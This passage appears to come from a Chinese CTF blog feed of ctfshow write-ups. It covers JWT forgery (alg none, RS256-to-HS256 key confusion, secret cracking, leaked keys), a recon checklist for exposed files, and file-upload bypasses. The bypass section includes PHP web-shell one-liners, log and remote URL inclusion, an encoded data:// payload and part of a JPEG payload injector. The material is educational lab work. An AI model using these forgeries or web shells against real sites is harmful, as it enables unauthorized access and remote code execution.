&#123;"iss":"http:\/\/demo.sjoerdlangkemper.nl\/","iat":1504006435,"exp":1504006555,"data":&#123;"hello":"world"&#125;&#125;</span><span class="token keyword">def</span> <span class="token function">b64urlencode</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">return</span> base64<span class="token punctuation">.</span>b64encode<span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">'+'</span><span class="token punctuation">,</span> <span class="token string">'-'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">,</span> <span class="token string">'_'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">'='</span><span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">)</span><span class="token keyword">print</span> b64urlencode<span class="token punctuation">(</span><span class="token string">"&#123;\"typ\":\"JWT\",\"alg\":\"none\"&#125;"</span><span class="token punctuation">)</span> <span class="token operator">+</span> \    <span class="token string">'.'</span> <span class="token operator">+</span> b64urlencode<span class="token punctuation">(</span><span class="token string">"&#123;\"data\":\"test\"&#125;"</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'.'</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>3.将RS256算法改为HS256（非对称密码算法&#x3D;&gt;对称密码算法）</strong></p><p>HS256算法使用密钥为所有消息进行签名和验证。</p><p>而RS256算法则使用私钥对消息进行签名并使用公钥进行身份验证。</p><p>如果将算法从RS256改为HS256，则后端代码将使用公钥作为密钥，然后使用HS256算法验证签名。</p><p>由于攻击者有时可以获取公钥，因此，攻击者可以将头部中的算法修改为HS256，然后使用RSA公钥对数据进行签名。</p><p>这样的话，后端代码使用RSA公钥+HS256算法进行签名验证。</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> jwt<span class="token comment"># eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9</span><span class="token comment"># &#123;"typ":"JWT","alg":"RS256"&#125;</span><span class="token comment"># eyJpc3MiOiJodHRwOlwvXC9kZW1vLnNqb2VyZGxhbmdrZW1wZXIubmxcLyIsImlhdCI6MTUwNDAwNzg3NCwiZXhwIjoxNTA0MDA3OTk0LCJkYXRhIjp7ImhlbGxvIjoid29ybGQifX0</span><span class="token comment"># &#123;"iss":"http:\/\/demo.sjoerdlangkemper.nl\/","iat":1504007874,"exp":1504007994,"data":&#123;"hello":"world"&#125;&#125;</span>public <span class="token operator">=</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'public.pem.1'</span><span class="token punctuation">,</span> <span class="token string">'r'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">print</span> public<span class="token keyword">print</span> jwt<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">&#123;</span><span class="token string">"data"</span><span class="token punctuation">:</span><span class="token string">"test"</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span> key<span class="token operator">=</span>public<span class="token punctuation">,</span> algorithm<span class="token operator">=</span><span class="token string">'HS256'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>4. 破解HS256（对称加密算法）密钥</strong></p><p>如果HS256密钥的强度较弱的话，攻击者可以直接通过蛮力攻击方式来破解密钥，例如将密钥字符串用作PyJWT库示例代码中的密钥的时候情况就是如此。</p><p>然后，用蛮力方式对密钥进行猜解，具体方法很简单：如果密钥正确的话，解密就会成功；如果密钥错误的话，解密代码就会抛出异常。</p><p>此外，我们也可以使用PyJWT或John Ripper进行破解测试。</p><h2 id="web345"><a href="#web345" class="headerlink" title="web345"></a>web345</h2><p><img src="/images/image-20220908101048234.png" alt="image-20220908101048234"></p><p>这个题我们解密发现他没有第三部分，所以也就用不着知道他的密钥了。直接每一部分base64然后用.连接就可以了。<br>第一部分{“alg”:”None”,”typ”:”jwt”}base64编码后是eyJhbGciOiJOb25lIiwidHlwIjoiand0In0(去掉等号)<br>第二部分[{“sub”:”admin”}]base64编码后是W3sic3ViIjoiYWRtaW4ifV0<br>所以把原来的jwt修改为eyJhbGciOiJOb25lIiwidHlwIjoiand0In0.W3sic3ViIjoiYWRtaW4ifV0然后访问&#x2F;admin即可</p><p>但不知道为什么不可以：</p><p>群主的做法是整个ans先base64解密，更改sub再加密</p><h2 id="web346"><a href="#web346" class="headerlink" title="web346"></a>web346</h2><p>jwt解密如下</p><p><img src="/images/image-20220908103927717.png" alt="image-20220908103927717"></p><p> 方法一：将算法改成none,user改成admin </p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> jwt<span class="token comment"># payload</span>token_dict <span class="token operator">=</span> <span class="token punctuation">&#123;</span>  <span class="token string">"iss"</span><span class="token punctuation">:</span> <span class="token string">"admin"</span><span class="token punctuation">,</span>  <span class="token string">"iat"</span><span class="token punctuation">:</span> <span class="token number">1632670820</span><span class="token punctuation">,</span>  <span class="token string">"exp"</span><span class="token punctuation">:</span> <span class="token number">1632678020</span><span class="token punctuation">,</span>  <span class="token string">"nbf"</span><span class="token punctuation">:</span> <span class="token number">1632670820</span><span class="token punctuation">,</span>  <span class="token string">"sub"</span><span class="token punctuation">:</span> <span class="token string">"admin"</span><span class="token punctuation">,</span>  <span class="token string">"jti"</span><span class="token punctuation">:</span> <span class="token string">"147cc3b129a041cdd38e3f127680d1e4"</span><span class="token punctuation">&#125;</span>headers <span class="token operator">=</span> <span class="token punctuation">&#123;</span>  <span class="token string">"alg"</span><span class="token punctuation">:</span> <span class="token string">"none"</span><span class="token punctuation">,</span>  <span class="token string">"typ"</span><span class="token punctuation">:</span> <span class="token string">"JWT"</span><span class="token punctuation">&#125;</span>jwt_token <span class="token operator">=</span> jwt<span class="token punctuation">.</span>encode<span class="token punctuation">(</span>token_dict<span class="token punctuation">,</span>  <span class="token comment"># payload, 有效载体</span>                       <span class="token string">""</span><span class="token punctuation">,</span>  <span class="token comment"># 进行加密签名的密钥</span>                       algorithm<span class="token operator">=</span><span class="token string">"none"</span><span class="token punctuation">,</span>   <span class="token comment"># 指明签名算法方式, 默认也是HS256</span>                       headers<span class="token operator">=</span>headers                        <span class="token comment"># json web token 数据结构包含两部分, payload(有效载体), headers(标头)</span>                       <span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>jwt_token<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>不知道为什么python的jwt库用不了</p><p>可以使用nodejs</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">const</span> jwt <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'jsonwebtoken'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">var</span> fs <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'fs'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">var</span> token <span class="token operator">=</span> jwt<span class="token punctuation">.</span><span class="token function">sign</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span>    <span class="token string-property property">"iss"</span><span class="token operator">:</span> <span class="token string">"admin"</span><span class="token punctuation">,</span>    <span class="token string-property property">"iat"</span><span class="token operator">:</span> <span class="token number">1662617808</span><span class="token punctuation">,</span>    <span class="token string-property property">"exp"</span><span class="token operator">:</span> <span class="token number">1662625008</span><span class="token punctuation">,</span>    <span class="token string-property property">"nbf"</span><span class="token operator">:</span> <span class="token number">1662617808</span><span class="token punctuation">,</span>    <span class="token string-property property">"sub"</span><span class="token operator">:</span> <span class="token string">"admin"</span><span class="token punctuation">,</span>    <span class="token string-property property">"jti"</span><span class="token operator">:</span> <span class="token string">"d83c7b55939a26d5c1f0f15700273131"</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">,</span><span class="token string">''</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span> <span class="token literal-property property">algorithm</span><span class="token operator">:</span> <span class="token string">'none'</span> <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>token<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>方法二：考猜(123456)</p><p><img src="/images/image-20220908111205390.png" alt="image-20220908111205390">方法三、使用爆破工具</p><p>密钥爆破 i工具:(一般第一个用的比较多)</p><p>c-jwt-cracker<br>Hashcat<br>john</p><h2 id="web348（爆破）"><a href="#web348（爆破）" class="headerlink" title="web348（爆破）"></a>web348（爆破）</h2><p>这里以jwtcracker为例：</p><p>下载文件到kali，解压进入目录，打开终端切换为root权限</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">docker</span> build <span class="token builtin class-name">.</span> <span class="token parameter variable">-t</span> jwtcrack<span class="token function">docker</span> run <span class="token parameter variable">-it</span> <span class="token parameter variable">--rm</span>  jwtcrack eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJhZG1pbiIsImlhdCI6MTYzMjgzODk1MiwiZXhwIjoxNjMyODQ2MTUyLCJuYmYiOjE2MzI4Mzg5NTIsInN1YiI6InVzZXIiLCJqdGkiOiI5M2QwODg0MTU5MzQ5MWJiMDc1NzZkNDI5NzFkODIyZSJ9.VlGkcoMcfvtRYv2kMczlfD8ns1hpN2pArD5PdrVgO6I<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>爆破出</p><p> <img src="/images/20201229205653862.png" alt="在这里插入图片描述"> </p><h2 id="web349（公私钥泄露）"><a href="#web349（公私钥泄露）" class="headerlink" title="web349（公私钥泄露）"></a>web349（公私钥泄露）</h2><p>首先给出一个app.js</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token comment">/* GET home page. */</span>router<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">,</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res<span class="token punctuation">,</span> next</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  res<span class="token punctuation">.</span><span class="token function">type</span><span class="token punctuation">(</span><span class="token string">'html'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">var</span> privateKey <span class="token operator">=</span> fs<span class="token punctuation">.</span><span class="token function">readFileSync</span><span class="token punctuation">(</span>process<span class="token punctuation">.</span><span class="token function">cwd</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">'//public//private.key'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">var</span> token <span class="token operator">=</span> jwt<span class="token punctuation">.</span><span class="token function">sign</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span> <span class="token literal-property property">user</span><span class="token operator">:</span> <span class="token string">'user'</span> <span class="token punctuation">&#125;</span><span class="token punctuation">,</span> privateKey<span class="token punctuation">,</span> <span class="token punctuation">&#123;</span> <span class="token literal-property property">algorithm</span><span class="token operator">:</span> <span class="token string">'RS256'</span> <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  res<span class="token punctuation">.</span><span class="token function">cookie</span><span class="token punctuation">(</span><span class="token string">'auth'</span><span class="token punctuation">,</span>token<span class="token punctuation">)</span><span class="token punctuation">;</span>  res<span class="token punctuation">.</span><span class="token function">end</span><span class="token punctuation">(</span><span class="token string">'where is flag?'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>router<span class="token punctuation">.</span><span class="token function">post</span><span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">,</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span>res<span class="token punctuation">,</span>next</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">var</span> flag<span class="token operator">=</span><span class="token string">"flag_here"</span><span class="token punctuation">;</span>res<span class="token punctuation">.</span><span class="token function">type</span><span class="token punctuation">(</span><span class="token string">'html'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">var</span> auth <span class="token operator">=</span> req<span class="token punctuation">.</span>cookies<span class="token punctuation">.</span>auth<span class="token punctuation">;</span><span class="token keyword">var</span> cert <span class="token operator">=</span> fs<span class="token punctuation">.</span><span class="token function">readFileSync</span><span class="token punctuation">(</span>process<span class="token punctuation">.</span><span class="token function">cwd</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">'//public/public.key'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">// get public key</span>jwt<span class="token punctuation">.</span><span class="token function">verify</span><span class="token punctuation">(</span>auth<span class="token punctuation">,</span> cert<span class="token punctuation">,</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">err<span class="token punctuation">,</span> decoded</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token keyword">if</span><span class="token punctuation">(</span>decoded<span class="token punctuation">.</span>user<span class="token operator">===</span><span class="token string">'admin'</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  res<span class="token punctuation">.</span><span class="token function">end</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>  res<span class="token punctuation">.</span><span class="token function">end</span><span class="token punctuation">(</span><span class="token string">'you are not admin'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>可以发现是密钥泄露，通过访问&#x2F;private.key和public.key来获得公私钥</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">const</span> jwt <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'jsonwebtoken'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">var</span> fs <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'fs'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">var</span> privateKey <span class="token operator">=</span> fs<span class="token punctuation">.</span><span class="token function">readFileSync</span><span class="token punctuation">(</span><span class="token string">'./private.key'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">var</span> token <span class="token operator">=</span> jwt<span class="token punctuation">.</span><span class="token function">sign</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span> <span class="token literal-property property">user</span><span class="token operator">:</span> <span class="token string">'admin'</span> <span class="token punctuation">&#125;</span><span class="token punctuation">,</span> privateKey<span class="token punctuation">,</span> <span class="token punctuation">&#123;</span> <span class="token literal-property property">algorithm</span><span class="token operator">:</span> <span class="token string">'RS256'</span> <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>token<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>修改admin后将得到的cookie传入，同时post一个参数就可以了</p><h2 id="web350（密钥混淆攻击）"><a href="#web350（密钥混淆攻击）" class="headerlink" title="web350（密钥混淆攻击）"></a>web350（密钥混淆攻击）</h2><p>只能找到公钥没有私钥</p><p>HS256算法使用密钥为所有消息进行签名和验证。</p><p>而RS256算法则使用私钥对消息进行签名并使用公钥进行身份验证。</p><p>如果将算法从RS256改为HS256，则后端代码将使用公钥作为密钥，然后使用HS256算法验证签名。</p><p>由于攻击者有时可以获取公钥，因此，攻击者可以将头部中的算法修改为HS256，然后使用RSA公钥对数据进行签名。</p><p>这样的话，后端代码使用RSA公钥+HS256算法进行签名验证。</p><p>node脚本</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">const</span> jwt <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'jsonwebtoken'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">var</span> fs <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'fs'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">var</span> privateKey <span class="token operator">=</span> fs<span class="token punctuation">.</span><span class="token function">readFileSync</span><span class="token punctuation">(</span><span class="token string">'public.key'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">var</span> token <span class="token operator">=</span> jwt<span class="token punctuation">.</span><span class="token function">sign</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span> <span class="token literal-property property">user</span><span class="token operator">:</span> <span class="token string">'admin'</span> <span class="token punctuation">&#125;</span><span class="token punctuation">,</span> privateKey<span class="token punctuation">,</span> <span class="token punctuation">&#123;</span> <span class="token literal-property property">algorithm</span><span class="token operator">:</span> <span class="token string">'HS256'</span> <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>token<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>运行 nodejs 获取 cookie 去替换即可</p>]]></content>
      
      
      
        <tags>
            
            <tag> ctfshow </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>信息收集</title>
      <link href="/2022/09/08/xin-xi-shou-ji/"/>
      <url>/2022/09/08/xin-xi-shou-ji/</url>
      
        <content type="html"><![CDATA[<p>1、查看源代码（ctr+U）</p><p>2、没有思路的时候抓个包，发个包</p><p>3、 robots.txt</p><p>下面就是要进行目录扫描了</p><p>4、index.phps phps源码泄露，可以用phps来进行下载源码</p><p>5、<a href="http://www.zip,www.rar,但是只是备份文件,一些已网站为准/">www.zip,www.rar,但是只是备份文件，一些已网站为准</a></p><p>6、 &#x2F;.git </p><p>7、 &#x2F;.svn</p><p>8、&#x2F;index.php.swp vim的备份文件 </p><p>9、查看cookie</p><p>10、 域名解析会产生很多记录，如A记录、CNAME记录、MX记录、txt记录等，可借助网站分别查询 （ <a href="https://zijian.aliyun.com/">https://zijian.aliyun.com/</a> ）网站查询，并不常用</p><p>11、 admin,login等常见后台文件名 </p><p>12、editor中的</p><p> 图片src为editor文件夹内，访问&#x2F;editor。<br><img src="/images/2856129-20220611061149010-129070457.png" alt="img"><br><img src="/images/2856129-20220611061416892-1184784892.png" alt="img"><br>文件空间内直接可以看到所有文件，一顿乱找，找到一个flag.sh文件，访问并未下载，导致容器崩溃。。。<br>下面复制的答案：<br>在tmp&#x2F;html&#x2F;nothinghere文件夹中找到fl000g,txt。访问这个地址，发现错误。原因是这个地址是绝对路径<br>从此处开始访问即访问url&#x2F;nothinghere&#x2F;fl000g.txt得到flag。<br>这题第一是不熟悉编辑器的漏洞，第二是这题最后找答案的路径确实有点莫名其妙了。 </p><p>13、 &#x2F;tz.php php探针泄露</p><p>14、 &#x2F;db&#x2F;db.mdb </p><p>15、 &#x2F;backup.sql </p>]]></content>
      
      
      
        <tags>
            
            <tag> ctfshow </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>文件上传</title>
      <link href="/2022/09/08/wen-jian-shang-chuan/"/>
      <url>/2022/09/08/wen-jian-shang-chuan/</url>
      
        <content type="html"><![CDATA[<h2 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h2><h2 id="1、-user-ini绕过"><a href="#1、-user-ini绕过" class="headerlink" title="1、.user.ini绕过"></a>1、.user.ini绕过</h2><p>当发现上传文件所在的文件夹中原本存在php文件，就可以用使用.user,ini</p><h2 id="2、文件内容检测"><a href="#2、文件内容检测" class="headerlink" title="2、文件内容检测[]"></a>2、文件内容检测[]</h2><h3 id="1、使用-代替"><a href="#1、使用-代替" class="headerlink" title="1、使用{ }代替"></a>1、使用{ }代替</h3><h3 id="2、使用array-pop等函数"><a href="#2、使用array-pop等函数" class="headerlink" title="2、使用array_pop等函数"></a>2、使用array_pop等函数</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token operator">&lt;</span>php <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token function">array_pop</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token delimiter important">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="3、PHP文件最后一行不用加分号"><a href="#3、PHP文件最后一行不用加分号" class="headerlink" title="3、PHP文件最后一行不用加分号"></a>3、PHP文件最后一行不用加分号</h2><p>但是必须要加上?&gt;才可以被认为是最后一行</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?=</span> <span class="token function">phpinfo</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token delimiter important">?></span></span>//执行<span class="token php language-php"><span class="token delimiter important">&lt;?=</span> <span class="token function">phpinfo</span><span class="token punctuation">(</span><span class="token punctuation">)</span>  <span class="token comment">//不执行</span><span class="token operator">&lt;</span><span class="token operator">?</span><span class="token operator">=</span> <span class="token function">phpinfo</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//执行</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h2 id="4、当过滤了（）可以考虑使用include-然后日志包含"><a href="#4、当过滤了（）可以考虑使用include-然后日志包含" class="headerlink" title="4、当过滤了（）可以考虑使用include 然后日志包含"></a>4、当过滤了（）可以考虑使用include 然后日志包含</h2><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?=</span> <span class="token keyword">include</span> <span class="token string single-quoted-string">'/var/log/nginx/access/log'</span><span class="token delimiter important">?></span></span>#如果对字符串中的关键字也进行了过滤#可以使用字符拼接绕过<span class="token php language-php"><span class="token delimiter important">&lt;?=</span> <span class="token keyword">include</span> <span class="token string single-quoted-string">'/var/lo'</span><span class="token operator">.</span><span class="token string single-quoted-string">'g/nginx/access/lo'</span><span class="token operator">.</span><span class="token string single-quoted-string">'g'</span><span class="token delimiter important">?></span></span>#php中.代表连接<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h2 id="5、当想文件包含时发现过滤了-，"><a href="#5、当想文件包含时发现过滤了-，" class="headerlink" title="5、当想文件包含时发现过滤了.，"></a>5、当想文件包含时发现过滤了<code>.</code>，</h2><h3 id="考虑session临时文件包含"><a href="#考虑session临时文件包含" class="headerlink" title="考虑session临时文件包含"></a>考虑session临时文件包含</h3><h3 id="考虑远程url包含"><a href="#考虑远程url包含" class="headerlink" title="考虑远程url包含"></a>考虑远程url包含</h3><p>但是要将域名的ip转换为10进制（这样才没有<code>.</code>）</p><p> <a href="http://175.178.196.226/">http://175.178.196.226/</a>  &#x3D;转化为10进制&#x3D;&gt;2947728610</p><p>在vps上写这么个文件</p><blockquote><p>注意：</p><p>1、不能写php脚本文件，不然脚本文件会在本地执行后再被包含，包含到的就只是本地执行后结果</p><p>2、不能使用eval($_POST[1]);简单的一句话，因为POST可能传不过去，</p><p>所以直接使用system(‘tac flag.php’);</p><p>3、可以写成index.html或者写成text等等</p><p>4、改变auto_prepend_file,需要等待一会才会变化</p></blockquote><h3 id="考虑使用"><a href="#考虑使用" class="headerlink" title="考虑使用"></a>考虑使用<img src="/images/image-20220814172854014-1662567533533.png" alt="image-20220814172854014"></h3><p><img src="/images/image-20220814173316357-1662567533534.png" alt="image-20220814173316357"></p><h3 id="取反构造："><a href="#取反构造：" class="headerlink" title="取反构造："></a>取反构造：</h3><p>payload :<code>data://text/plain,&lt;?php eval($_POST[1]);?&gt;</code></p><p>&#x3D;&gt;~%9b%9e%8b%9e%c5%d0%d0%8b%9a%87%8b%d0%8f%93%9e%96%91%d3%c3%c0%8f%97%8f%df%9a%89%9e%93%d7%db%a0%af%b0%ac%ab%a4%ce%a2%d6%c4%c0%c1</p><p>但是POST的话要在BP上将<code>%9b%9e%8b%9e%c5%d0%d0%8b%9a%87%8b%d0%8f%93%9e%96%91%d3%c3%c0%8f%97%8f%df%9a%89%9e%93%d7%db%a0%af%b0%ac%ab%a4%ce%a2%d6%c4%c0%c1</code>先进行url decode</p><h2 id="6、图片马，二次渲染"><a href="#6、图片马，二次渲染" class="headerlink" title="6、图片马，二次渲染"></a>6、图片马，二次渲染</h2><h3 id="图片马"><a href="#图片马" class="headerlink" title="图片马"></a>图片马</h3><p>当发现网站有用文件包含的形式查看上传图片的功能</p><p>注意：<strong>记得清缓存，或者用bp发包</strong>不然图片没有变化</p><p>imagecreatefromjpeg（）函数<br>二次渲染是由Gif文件或 URL 创建一个新图象。成功则返回一图像标识符&#x2F;图像资源，失败则返回false，导致图片马的数据丢失，上传图片马失败。<br>进行通关<br>按照原来的方法进行上传，我们可以发现还是可以上传的，但是配合包含漏洞却无法解析，这时我们把上传的图片复制下来用Notepad打开，发现我们原来写的php代码没有了，这就是二次渲染把我们里面的php代码删掉了。<br>我们<br>把原图和他修改过的图片进行比较，看看哪个部分没有被修改。将php代码放到没有被更改的部分，配合包含漏洞，就可以了。</p><p>发现上传成功后并不是以目录形式访问而是一个文件指针</p><p><img src="/images/image-20220814174756029-1662567533534.png" alt="image-20220814174756029"></p><p>说明可能存在<strong>文件包含</strong>，我们只需要上传一个图片马即可</p><h3 id="二次渲染绕过"><a href="#二次渲染绕过" class="headerlink" title="二次渲染绕过"></a>二次渲染绕过</h3><p>二次渲染是一种<strong>防御图片马的一种技术</strong></p><p><img src="/images/image-20220814175556363-1662567533534.png" alt="image-20220814175556363"></p><p>发包返回中存在<code>&gt;CREATOR: gd-jpeg v1.0 (using IJG JPEG v80), default quality&gt;CREATOR: gd-jpeg v1.0 (using IJG JPEG v80), default quality</code>说明存在jpg的二次渲染</p><p>生成脚本</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>    <span class="token comment">/*    The algorithm of injecting the payload into the JPG image, which will keep unchanged after transformations caused by PHP functions imagecopyresized() and imagecopyresampled().    It is necessary that the size and quality of the initial image are the same as those of the processed image.    1) Upload an arbitrary image via secured files upload script    2) Save the processed image and launch:    jpg_payload.php &lt;jpg_name.jpg>    In case of successful injection you will get a specially crafted image, which should be uploaded again.    Since the most straightforward injection method is used, the following problems can occur:    1) After the second processing the injected data may become partially corrupted.    2) The jpg_payload.php script outputs "Something's wrong".    If this happens, try to change the payload (e.g. add some symbols at the beginning) or try another initial image.    Sergey Bobrov @Black2Fan.    See also:    https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/    */</span>    <span class="token variable">$miniPayload</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"&lt;?=phpinfo();?>"</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">extension_loaded</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'gd'</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token operator">!</span><span class="token function">function_exists</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'imagecreatefromjpeg'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'php-gd is not installed'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$argv</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'php jpg_payload.php &lt;jpg_name.jpg>'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token function">set_error_handler</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"custom_error_handler"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token variable">$pad</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token variable">$pad</span> <span class="token operator">&lt;</span> <span class="token number">1024</span><span class="token punctuation">;</span> <span class="token variable">$pad</span><span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token variable">$nullbytePayloadSize</span> <span class="token operator">=</span> <span class="token 